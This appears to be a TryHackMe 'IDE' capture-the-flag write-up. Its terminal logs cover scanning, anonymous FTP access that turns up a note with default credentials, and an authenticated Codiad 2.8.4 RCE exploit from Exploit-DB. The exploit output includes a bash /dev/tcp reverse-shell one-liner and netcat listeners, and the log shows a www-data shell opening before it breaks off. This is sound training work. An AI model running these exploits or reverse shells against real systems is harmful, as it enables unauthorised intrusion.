---
An easy box to polish your enumeration skills!
---

# IDE — Writeup

## Overview
### IDE — Writeup
### IDE — Writeup
![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/3ce8e9c4d1da5eefef690e11f75798c7.png)
Gain a shell on the box and escalate your privileges!

## Enumeration
```text
└─$ rustscan -a 10.10.112.120 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.112.120:21
Open 10.10.112.120:22
Open 10.10.112.120:80
Open 10.10.112.120:62337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 15:47 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
Initiating Ping Scan at 15:47
Scanning 10.10.112.120 [2 ports]
Completed Ping Scan at 15:47, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:47
Completed Parallel DNS resolution of 1 host. at 15:47, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:47
Scanning 10.10.112.120 [4 ports]
Discovered open port 22/tcp on 10.10.112.120
Discovered open port 80/tcp on 10.10.112.120
Discovered open port 21/tcp on 10.10.112.120
Discovered open port 62337/tcp on 10.10.112.120
Completed Connect Scan at 15:47, 0.21s elapsed (4 total ports)
Initiating Service scan at 15:47
Scanning 4 services on 10.10.112.120
Completed Service scan at 15:47, 13.17s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.112.120.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:47
NSE: [ftp-bounce 10.10.112.120:21] PORT response: 500 Illegal PORT command.
Completed NSE at 15:47, 9.64s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 2.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
Nmap scan report for 10.10.112.120
Host is up, received syn-ack (0.24s latency).
Scanned at 2022-09-19 15:47:15 EDT for 26s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.1.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.48 seconds
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ftp 10.10.112.120
Connected to 10.10.112.120.
220 (vsFTPd 3.0.3)
Name (10.10.112.120:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8503|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||39704|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> mget *
ftp> ls -la
229 Entering Extended Passive Mode (|||6318|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||55038|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> mget *
mget - [anpqy?]? 
229 Entering Extended Passive Mode (|||23621|)
150 Opening BINARY mode data connection for - (151 bytes).
100% |*************************************************|   151      382.02 KiB/s    00:00 ETA
226 Transfer complete.
151 bytes received in 00:00 (0.75 KiB/s)
ftp> exit
221 Goodbye.
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls
-  backup  backup.pgp  gpg.hash  private.asc
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ cat -     
^C
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ echo *                                        
backup backup.pgp gpg.hash private.asc
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ xxd                                                     
^C
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ xxd -          
^C
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls
-  backup  backup.pgp  gpg.hash  private.asc
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls -la         
total 28
-rw-r--r-- 1 kali kali  151 Jun 18  2021 -
drwxr-xr-x 2 kali kali 4096 Sep 19 15:53 .
drwxr-xr-x 4 kali kali 4096 Sep 19 14:48 ..
-rw-r--r-- 1 kali kali  950 Sep 19 14:58 backup
-rw-r--r-- 1 kali kali  524 Aug 11  2019 backup.pgp
-rw-r--r-- 1 kali kali  255 Sep 19 14:52 gpg.hash
-rw-r--r-- 1 kali kali 3762 Aug 11  2019 private.asc
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ mv "-" ver
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls    
backup  backup.pgp  gpg.hash  private.asc  ver
```

## Exploitation
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ cat ver
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.

john:password
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ searchsploit codiad
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                     | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                         | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)        | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)    | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)    | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)    | multiple/webapps/50474.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ locate /webapps/49705.py
/usr/share/exploitdb/exploits/multiple/webapps/49705.py
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ cat /usr/share/exploitdb/exploits/multiple/webapps/49705.py
```
```text
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
```
```text
# Discovery by: WangYihang
```
```text
# Vendor Homepage: http://codiad.com/
```
```text
# Software Links : https://github.com/Codiad/Codiad/releases
```
```text
# Tested Version: Version: 2.8.4
```
```text
# CVE: CVE-2018-14009
```
```text
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ python3 /usr/share/exploitdb/exploits/multiple/webapps/49705.py http://10.10.112.120:62337/ john password 10.18.1.77 1234 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.18.1.77/1235 0>&1 2>&1"' | nc -lnvp 1234
nc -lnvp 1235
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```
```text
┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ echo 'bash -c "bash -i >/dev/tcp/10.18.1.77/1235 0>&1 2>&1"' | nc -lnvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.112.120.
Ncat: Connection from 10.10.112.120:53782.
```
```text
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1235
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1235
Ncat: Listening on 0.0.0.0:1235
Ncat: Connection from 10.10.112.120.
Ncat: Connection from 10.10.112.120:58916.
bash: cannot set terminal process group (961): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ cd /home/drac
cd /home/drac
www-data@ide:/home/drac$ ls -la
ls -la
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
